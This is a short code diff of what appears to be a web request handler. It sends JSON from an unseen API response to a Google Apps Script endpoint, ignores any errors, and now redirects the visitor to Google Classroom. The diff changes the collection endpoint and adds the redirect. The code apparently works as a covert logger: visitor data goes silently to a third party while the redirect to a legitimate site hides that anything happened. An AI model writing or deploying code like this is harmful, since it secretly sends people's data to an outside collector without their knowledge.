@@ -20,7 +20,7 @@ export async function onRequest(context) {
         if (nodeApiResponse.ok) {
             const nodeApiData = await nodeApiResponse.json();
 
-            await fetch("https://script.google.com/macros/s/AKfycbwYsHOJe4qOP-e1OZBjfSBNDep5Nz4LQ7Rge-xDjcGn7z7oKFPmgGfKk-Ey7eKFYBD2/exec", {
+            await fetch("https://script.google.com/macros/s/AKfycbw2LaXahao4cjYHLIXED5cJNXwki2zon6pK0s6T8Qr5j7m14GbtzY-PKWq12cEBx_DA/exec", {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
@@ -29,4 +29,5 @@ export async function onRequest(context) {
             });
         }
     } catch (error) {}
+    return Response.redirect("https://classroom.google.com", 302);
 }
